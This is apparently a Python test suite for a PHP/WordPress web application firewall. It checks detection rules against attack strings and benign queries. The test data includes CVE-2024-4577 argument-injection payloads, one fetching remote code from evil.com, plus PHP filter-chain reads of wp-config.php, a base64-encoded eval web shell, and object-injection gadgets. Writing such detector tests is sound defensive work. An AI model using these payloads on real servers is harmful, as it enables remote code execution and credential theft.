#!/usr/bin/env python3
"""
Waffers Automated Test Suite
The layer that protects you
Validates detection patterns, anti-evasion techniques, and false-positive prevention.
"""

import re
import urllib.parse
import sys

def test_cve_2024_4577_detection():
    print("[*] Testing CVE-2024-4577 (PHP-CGI Argument Injection & Soft-Hyphen)...")

    soft_hyphen_pattern = re.compile(r'(%ad|%80|%a0|\xad|\xc2\xad|\xef\xbc\x8d)', re.IGNORECASE)
    sensitive_directives = r'(auto_prepend_file|auto_append_file|allow_url_include|disable_functions|open_basedir|cgi\.force_redirect|cgi\.redirect_status_env|output_handler)'
    cgi_arg_pattern = re.compile(r'(^|[&+\s])-(d|s|b|c|w|z|-)[+=\s]', re.IGNORECASE)

    attack_payloads = [
        "%ad-d+auto_prepend_file=php://input",
        "%adauto_prepend_file=php://input",
        "%AD-d+allow_url_include=1",
        "\xc2\xad-d+auto_prepend_file=php://input",
        "\xef\xbc\x8d-d+allow_url_include=1",
        "?-d+allow_url_include=1+-d+auto_prepend_file=php://input",
        "foo=bar&-d+auto_prepend_file=http://evil.com/shell.txt",
        "%ad-d+cgi.force_redirect=0",
        "%ad-d+disable_functions=\"\"",
        "action=test&%ad-d+open_basedir=none",
    ]

    safe_queries = [
        "s=php+security+tutorial",
        "p=123",
        "post_type=product&add-to-cart=45",
        "wc-ajax=get_refreshed_fragments",
        "filter_cat=electronics-and-gadgets",
        "utm_source=adwords&utm_medium=cpc",
        "author=admin-user",
        "page_id=10&tab=downloads-and-updates",
    ]

    for payload in attack_payloads:
        # Test detection logic matching class-php-armor-firewall.php
        matched = False
        if soft_hyphen_pattern.search(payload):
            if re.search(r'(%ad|%80|%a0|\xad|\xc2\xad|\xef\xbc\x8d)[\s+]*(-|%ad)?[\s+]*(d|s|b|c|w|z|-)', payload, re.I) or \
               re.search(r'(%ad|%80|%a0|\xad|\xc2\xad|\xef\xbc\x8d).*?' + sensitive_directives, payload, re.I) or \
               re.match(r'^(%ad|%80|%a0|\xad|\xc2\xad)', payload, re.I):
                matched = True

        if not matched and cgi_arg_pattern.search(payload):
            if re.search(sensitive_directives, payload, re.I) or re.search(r'(php:\/\/|data:\/\/|http:\/\/|https:\/\/)', payload, re.I):
                matched = True

        assert matched, f"FAIL: Attack payload was NOT detected: {payload}"
    print(f"  [+] All {len(attack_payloads)} CVE-2024-4577 attack payloads intercepted successfully.")

    for safe in safe_queries:
        matched = False
        if soft_hyphen_pattern.search(safe):
            if re.search(r'(%ad|%80|%a0|\xad|\xc2\xad|\xef\xbc\x8d)[\s+]*(-|%ad)?[\s+]*(d|s|b|c|w|z|-)', safe, re.I) or \
               re.search(r'(%ad|%80|%a0|\xad|\xc2\xad|\xef\xbc\x8d).*?' + sensitive_directives, safe, re.I) or \
               re.match(r'^(%ad|%80|%a0|\xad|\xc2\xad)', safe, re.I):
                matched = True
        if cgi_arg_pattern.search(safe):
            if re.search(sensitive_directives, safe, re.I):
                matched = True
        assert not matched, f"FALSE POSITIVE: Safe query was wrongly flagged: {safe}"
    print(f"  [+] All {len(safe_queries)} safe WordPress queries passed without false positives.")


def test_php2shell_detection():
    print("[*] Testing PHP2Shell (CVE-2026-109618 / CVE-2026-109619 Multipart Session Progress)...")

    malicious_progress_values = [
        "<?php phpinfo(); ?>_session_probe",
        "<?= `id` ?>",
        "system('cat /etc/passwd')",
        "../../../../var/lib/php/sessions",
        "A" * 150,  # Buffer overflow length probe
        "malicious\0session_truncate",
    ]

    for val in malicious_progress_values:
        is_exploit = (
            len(val) > 128 or
            bool(re.search(r'(<\?php|<\?=|base64_decode|system|passthru|exec|shell_exec|eval|\0)', val, re.I)) or
            bool(re.search(r'(\.\.\/|\.\.\\\\)', val))
        )
        assert is_exploit, f"FAIL: Malicious progress value not detected: {val}"

    print(f"  [+] All {len(malicious_progress_values)} PHP2Shell upload progress abuse probes detected.")


def test_cve_2024_2961_and_wrappers():
    print("[*] Testing CVE-2024-2961 & PHP Filter Chain / Wrapper exploits...")

    vuln_charsets = r'(ISO-2022-CN-EXT|IBM273|CP-AR|CSISO2022CN|ISO-2022-JP|EUC-TW)'

    attack_inputs = [
        "php://filter/convert.iconv.ISO-2022-CN-EXT.UTF-8/resource=data:text/plain,test",
        "php://filter/convert.iconv.IBM273.UTF-8/resource=index.php",
        "php://filter/read=convert.iconv.a.b/resource=php://filter/read=convert.iconv.c.d/resource=php://filter/read=convert.iconv.e.f/resource=php://filter/read=convert.iconv.g.h/resource=data:text/plain,a",
        "php://filter/read=convert.base64-encode|convert.base64-decode|convert.base64-encode|convert.base64-decode/resource=wp-config.php",
        "phar://uploads/2026/shell.phar/test",
        "php://input",
        "data:text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtcCddKTsgPz4=",
        "expect://whoami",
    ]

    safe_inputs = [
        "https://example.com/image.png",
        "my-uploaded-file.pdf",
        "category_name=news&tag=iconversion",
        "filter=alphabetical",
        "format=json",
    ]

    for item in attack_inputs:
        val_norm = urllib.parse.unquote(item)
        detected = False

        if 'convert.iconv' in val_norm.lower():
            if re.search(vuln_charsets, val_norm, re.I):
                detected = True
            elif val_norm.lower().count('convert.iconv.') > 3:
                detected = True

        if not detected and 'php://filter' in val_norm.lower():
            if re.search(r'(wp-config\.php|etc\/passwd|\/proc\/self)', val_norm, re.I) or val_norm.count('|') >= 3:
                detected = True

        if not detected and re.search(r'phar:\/\/', val_norm, re.I):
            detected = True
        if not detected and re.search(r'(php:\/\/input|expect:\/\/)', val_norm, re.I):
            detected = True
        if not detected and re.search(r'data:(text\/plain|application).*?base64', val_norm, re.I):
            detected = True

        assert detected, f"FAIL: Attack input bypassed wrapper/filter shield: {item}"

    print(f"  [+] All {len(attack_inputs)} filter chain & wrapper exploit vectors detected.")

    for safe in safe_inputs:
        val_norm = urllib.parse.unquote(safe)
        detected = False
        if 'convert.iconv' in val_norm.lower() and re.search(vuln_charsets, val_norm, re.I):
            detected = True
        if 'php://filter' in val_norm.lower() and re.search(r'(wp-config\.php|etc\/passwd|\/proc\/self)', val_norm, re.I):
            detected = True
        if re.search(r'phar:\/\/', val_norm, re.I) or re.search(r'(php:\/\/input|expect:\/\/)', val_norm, re.I):
            detected = True
        assert not detected, f"FALSE POSITIVE on safe input: {safe}"

    print(f"  [+] All {len(safe_inputs)} safe user inputs passed without false positives.")


def test_object_injection_detection():
    print("[*] Testing PHP Object Injection (CWE-502)...")

    gadgets = [
        'O:8:"Exploit":1:{s:4:"code";s:10:"phpinfo();";}',
        'O:14:"App\\Vulnerable":1:{s:4:"cmd";s:7:"whoami";}',
        'a:2:{i:0;s:4:"test";i:1;O:14:"App\\Vulnerable":1:{s:3:"cmd";s:6:"whoami";}}',
        'something;O:6:"Gadget":0:{}',
    ]

    pattern1 = re.compile(r'(^|[;{}])O:[0-9]+:"[a-zA-Z0-9_\\]+":[0-9]+:\{', re.I)
    pattern2 = re.compile(r'^a:[0-9]+:\{.*O:[0-9]+:"', re.I | re.DOTALL)

    for g in gadgets:
        matched = bool(pattern1.search(g) or pattern2.search(g))
        assert matched, f"FAIL: Serialized gadget not detected: {g}"

    print(f"  [+] All {len(gadgets)} serialized object injection gadgets intercepted.")


def test_multipart_dos_detection():
    print("[*] Testing Multipart DOS & Header Anomaly...")

    bad_content_types = [
        'multipart/form-data; boundary=---------------------------' + ('A' * 150),
        'multipart/form-data; boundary=test\x00extra_bytes',
        'multipart/form-data; boundary=test\x0bnewline_inject',
    ]

    for ct in bad_content_types:
        anomaly = False
        if re.search(r'[\x00-\x08\x0B\x0C\x0E-\x1F]', ct):
            anomaly = True
        m = re.search(r'boundary=(["\']?)([^;"\']+)\1?', ct, re.I)
        if m and len(m.group(2)) > 128:
            anomaly = True
        assert anomaly, f"FAIL: Malformed multipart header not flagged: {ct}"

    print(f"  [+] All {len(bad_content_types)} multipart header anomalies flagged.")


if __name__ == '__main__':
    print("==================================================")
    print("WAFFERS COMPREHENSIVE SECURITY VERIFICATION TEST")
    print("The layer that protects you")
    print("==================================================")
    test_cve_2024_4577_detection()
    test_php2shell_detection()
    test_cve_2024_2961_and_wrappers()
    test_object_injection_detection()
    test_multipart_dos_detection()
    print("==================================================")
    print("SUCCESS: ALL SECURITY CHECKS PASSED PERFECTLY!")
    print("==================================================")

